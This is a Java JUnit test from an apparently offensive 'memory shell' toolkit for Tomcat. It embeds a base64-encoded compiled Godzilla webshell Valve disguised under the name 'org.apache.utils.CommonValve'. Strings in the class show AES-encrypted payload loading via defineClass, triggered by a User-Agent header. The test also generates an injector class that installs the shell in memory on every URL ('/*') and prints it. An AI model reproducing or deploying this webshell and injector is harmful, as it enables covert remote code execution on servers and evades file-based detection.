package com.reajason.javaweb.memsell.tomcat.injector;

import com.reajason.javaweb.memsell.InjectorGenerator;
import com.reajason.javaweb.util.ClassUtils;
import com.reajason.javaweb.util.CommonUtil;
import lombok.SneakyThrows;
import org.apache.commons.codec.binary.Base64;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
class TomcatValveInjectorTest {

    @Test
    @SneakyThrows
    void generate() {
        byte[] shellBytes = Base64.decodeBase64("yv66vgAAADQBKQoARACSCgBEAJMKAEQAlAgAlQoAlgCXBwCYCQAaAJkKAD0AmgoABgCbCgCWAJwKAJYAnQcAngkAGgCfCQAaAKAJABoAoQoAogCjCQAaAKQKAD0ApQoAogCmCQAaAKcKAKIAqAoAGgCpCgAaAKoIAKsLAKwArQcArgoAPACvCgAkALAKABoAkwoAGgCxCwCsALIIALMKAKIAsgcAtAoAIgCSBwC1CgAkALYKADwAtwoAuAC5CQAaALoKAD0AuwoAvAC9CgA8AL4KACIAvwoAGgDACgA9AMEKALgAwgoAGgDDCwBFAMQKAAwAxQgAxgoAJADHCADIBwDJCgAkAMoHAMsKAMwAzQgAzgcAXQcAzwcA0AgA0QgA0ggA0wgA1AgA1QgA1gcA1wcA2AEABG5leHQBABtMb3JnL2FwYWNoZS9jYXRhbGluYS9WYWx2ZTsBAA5hc3luY1N1cHBvcnRlZAEAAVoBAANrZXkBABJMamF2YS9sYW5nL1N0cmluZzsBAARwYXNzAQAKaGVhZGVyTmFtZQEAC2hlYWRlclZhbHVlAQADbWQ1AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADxMY29tL3JlYWphc29uL2phdmF3ZWIvbWVtc2VsbC90b21jYXQvZ29kemlsbGEvR29kemlsbGFWYWx2ZTsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQANU3RhY2tNYXBUYWJsZQcArgcA2QcAngEAB2dldE5leHQBAB0oKUxvcmcvYXBhY2hlL2NhdGFsaW5hL1ZhbHZlOwEAB3NldE5leHQBAB4oTG9yZy9hcGFjaGUvY2F0YWxpbmEvVmFsdmU7KVYBAAV2YWx2ZQEAEGlzQXN5bmNTdXBwb3J0ZWQBAAMoKVoBABFiYWNrZ3JvdW5kUHJvY2VzcwEABmludm9rZQEAUihMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDtMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2U7KVYBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAFlAQAHcmVxdWVzdAEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEACHJlc3BvbnNlAQAoTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwcA2gEACkV4Y2VwdGlvbnMHANsHANwBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUHANABAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEAClNvdXJjZUZpbGUBABJHb2R6aWxsYVZhbHZlLmphdmEMAFAAUQwAUABXDADdAN4BAANBRVMHANkMAN8A4AEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAEoASwwA4QDiDABQAOMMAOQA5QwA5gDnAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwARgBHDABIAEkMAE0ASwcA6AwA6QDqDABOAEsMAOsA7AwA7QDuDABMAEsMAO8A6gwAjQCODABeAF8BAAdwYXlsb2FkBwDaDADwAPEBADpjb20vcmVhamFzb24vamF2YXdlYi9tZW1zZWxsL3RvbWNhdC9nb2R6aWxsYS9Hb2R6aWxsYVZhbHZlDADyAPMMAPQA9QwAWgBbDAD2APcBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BAA9qYXZhL2xhbmcvQ2xhc3MMAPgA+QwA+gD7BwD8DAD9AP4MAE8ASwwA/wEABwEBDAECAQMMAQQBBQwBBgDiDACEAIUMAP8BBwwBCABRDABqAGsMAHIAcwwBCQBRAQAQamF2YS51dGlsLkJhc2U2NAwBCgELAQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBDAENAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBDgwAcgEPAQAOZW5jb2RlVG9TdHJpbmcBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAGW9yZy9hcGFjaGUvY2F0YWxpbmEvVmFsdmUBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAJm9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALZmx1c2hCdWZmZXIBAA9wcmludFN0YWNrVHJhY2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABxvcmcvYXBhY2hlL3V0aWxzL0NvbW1vblZhbHZlBwEQCABMCQERAKcBABAzYzZlMGI4YTljMTUyMjRhCAEUCQERAJkBACAxMUNENkE4NzU4OTg0MTYzNkMzN0FDODI2QTJBMDRCQwgBFwkBEQC6AQAKVXNlci1BZ2VudAgBGgkBEQChAQAEdGVzdAgBHQkBEQCkAQAeTG9yZy9hcGFjaGUvdXRpbHMvQ29tbW9uVmFsdmU7CQERAJ8JAREAoAoBEQCpCgERAKoKAREAkwoB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");
        String shellClassName = "org.apache.utils.CommonValve";
        String injectClassName = this.getClass().getName() + "1";
        byte[] bytes = InjectorGenerator.generate(TomcatValveInjector.class, injectClassName, shellClassName, shellBytes, "/*");
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(injectClassName, obj.getClass().getName());
        assertEquals(shellClassName, ClassUtils.invokeMethod(obj, "getClassName", null, null).toString());
        assertEquals("/*", ClassUtils.invokeMethod(obj, "getUrlPattern", null, null).toString());
        assertEquals(Base64.encodeBase64String(CommonUtil.gzipCompress(shellBytes)).replace(System.lineSeparator(), ""),
                ClassUtils.invokeMethod(obj, "getBase64String", null, null).toString());
        System.out.println(Base64.encodeBase64String(bytes));
    }
}